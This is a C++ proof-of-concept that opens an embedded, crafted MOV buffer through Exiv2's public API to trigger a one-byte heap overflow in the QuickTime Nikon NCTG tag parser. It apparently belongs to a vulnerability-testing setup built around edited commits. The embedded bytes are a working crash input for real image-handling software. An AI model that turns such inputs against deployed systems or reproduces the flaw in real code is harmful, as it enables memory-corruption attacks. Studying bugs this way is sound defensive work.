/*
 * Proof-of-concept probe for a heap-buffer-overflow (CWE-787) in
 * Exiv2's QuickTime/MOV reader (QuickTimeVideo::NikonTagsDecoder).
 *
 * Drives the PUBLIC Exiv2 API (ImageFactory::open + readMetadata) with an
 * in-contract, crafted MOV byte buffer.  On the composed (edited) tree the
 * Nikon NCTG tag parser writes one byte past a 200-byte heap buffer; under
 * AddressSanitizer this aborts (SIGABRT / rc 134).  On the original batch
 * (and on either single edited commit alone) the same input is handled
 * safely and the program exits 0.
 *
 * Self-contained: the MOV bytes are embedded below.  pocs/poc.mov holds the
 * same bytes for reference.
 */
#include <exiv2/exiv2.hpp>

static const unsigned char kMov[] = {0,0,0,16,102,116,121,112,113,116,32,32,113,116,32,32,0,0,0,224,117,100,116,97,0,0,0,216,78,67,84,71,0,0,0,1,0,2,0,200,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65};

int main(void) {
  try {
    Exiv2::Image::UniquePtr image =
        Exiv2::ImageFactory::open(kMov, sizeof(kMov));
    image->readMetadata();
  } catch (const Exiv2::Error&) {
    /* In-contract parse errors are fine; only a memory fault should abort. */
  }
  return 0;
}
